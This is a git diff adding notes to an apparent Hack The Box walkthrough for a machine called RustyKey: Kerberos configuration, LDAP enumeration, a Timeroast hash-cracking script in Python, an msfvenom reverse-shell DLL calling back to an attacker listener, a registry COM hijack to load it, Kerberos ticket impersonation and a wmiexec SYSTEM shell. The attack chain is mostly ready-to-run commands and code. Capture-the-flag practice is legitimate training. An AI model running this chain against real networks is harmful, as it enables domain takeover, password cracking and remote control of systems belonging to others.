@@ -230,5 +230,157 @@ certipy-ad auth 0pfx forged_admin.pfx -dc-ip 10.10.11.x -username 'administrator
 
 16. You are ready to connect with evil-winrm:
 evil-winrm -i 10.10.11.x -u administrator -H'd803303515bf814ac14c5f1702abh866....'
+--------------------------------------------------------------------------------------------------------
+
+You have creds!
+
+add etc/hosts with dc. and with nothing
+
+configure your /etc/krb5.conf file to be like this:
+
+[libdefaults]
+ default_realm = RUSTYKEY.HTB
+ kdc_timesync = 1
+ ccache_type = 4
+ forwardable = true
+ proxiable = true
+ fcc-mit-ticketflags = true
+ dns_canonicalize_hostname = false
+ dns_lookup_realm = false
+ dns_lookup_kdc = true
+ k5login_authoritative = false
+[realms]
+ RUSTYKEY.HTB = {
+ kdc = rustykey.htb
+ admin_server = rustykey.htb
+ default_admin = rustykey.htb
+ }
+[domain_realm]
+ .rustykey.htb = RUSTYKEY.HTB
 
 
+and now user enumeration:
+
+ 1. ldapsearch -x -H ldap://10.10.xx.xx -D '<username>@rustykey.htb' -w 'passowrd' -b 'dc=<name>,dc=htb' "(objectClass=user)" userPrincipalName
+
+2. Then bloodhound enumeration with the script i have
+
+3. Then use https://github.com/SecuraBV/Timeroast
+
+Timeroasting takes advantage of Windows' NTP
+authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any
+computer or trust account by sending an NTP request with
+that account's RID. This is not a problem when computer
+accounts are properly generated, but if a non-standard or
+legacy default password is set this tool allows you to bruteforce those offline.
+
+
+edit to be like this:
+
+#!/usr/bin/env python3
+"""Perform a simple dictionary attack against the output of timeroast.py. Necessary because
+the NTP 'hash' format
+unfortunately does not fit into Hashcat or John right now.
+Not even remotely optimized, but still useful for cracking legacy default passwords (where
+the password is the computer
+name) or specific default passwords that are popular in an organisation.
+"""
+from binascii import hexlify, unhexlify
+from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
+from typing import TextIO, Generator, Tuple
+import hashlib, sys, re
+HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'
+def md4(data: bytes) -> bytes:
+try:
+return hashlib.new('md4'
+, data).digest()
+except ValueError:
+from md4 import MD4 # Fallback to pure Python if OpenSSL has no MD4
+return MD4(data).bytes()
+def compute_hash(password: str, salt: bytes) -> bytes:
+"""Compute a legacy NTP authenticator 'hash'
+.
+"""
+return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
+def try_crack(hashfile: TextIO, dictfile: TextIO) -> Generator[Tuple[int, str], None, None]:
+hashes = []
+for line in hashfile:
+line = line.strip()
+if line:
+m = re.match(HASH_FORMAT, line)
+if not m:
+print(f'ERROR: invalid hash format: {line}'
+, file=sys.stderr)
+sys.exit(1)
+rid, hashval, salt = m.group('rid'
+,
+'hashval'
+,
+'salt')
+hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
+for password in dictfile:
+password = password.strip()
+for rid, hashval, salt in hashes:
+if compute_hash(password, salt) == hashval:
+yield rid, password
+def main():
+argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
+"""Perform a simple dictionary attack against the output of timeroast.py.
+Not even remotely optimized, but still useful for cracking legacy default
+passwords (where the password is the computer name) or specific default
+passwords that are popular in an organisation.
+""")
+argparser.add_argument('hashes'
+, type=FileType('r'), help='Output of timeroast.py')
+argparser.add_argument('dictionary'
+, type=lambda f: open(f, encoding='latin-1'),
+help='Line-delimited password dictionary (e.g. rockyou.txt)')
+args = argparser.parse_args()
+crackcount = 0
+for rid, password in try_crack(args.hashes, args.dictionary):
+print(f'[+] Cracked RID {rid} password: {password}')
+crackcount += 1
+print(f'\n{crackcount} passwords recovered.
+')
+if __name__ == '__main__':
+main()
+
+
+4. python3 timeroast.py 10.10.11.75 -o <name>.hashes
+
+   python3 timecrack.py rustykey.hashes2 /usr/share/wordlists/rockyou.txt
+
+
+6. OR use this: nxc smb 10.10.11.75 -M timeroast
+
+--------------------------------------------------------------------------------------
+usefull tools:
+
+RunasCs.exe
+
+accesschk.exe
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.x LPORT=4444 -f dll -o rev.dll
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp;
+set LHOST 10.10.16.x; set LPORT 4444; exploit"
+
+upload rev.dll
+
+reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"
+/ve /d "C:\Tools\rev.dll" /f
+
+faketime.... impacket-getST -spn 'cifs/DC.<name>.htb' -impersonate backupadmin -dc-ip 10.10.11.XX -k
+'<NAME>.HTB/IT-COMPUTER3$:<password>'
+
+We export the received ticket as a Kerberos cache
+
+export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+
+We run wmiexec.py to get a shell as NT/SYTEM
+
+impacket-wmiexec -k -no-pass '<NAME>.HTB/backupadmin@dc.<name>.htb'
+
+We retrieve the root.txt flag
+
+type C:\Users\Administrator\Desktop\root.txt
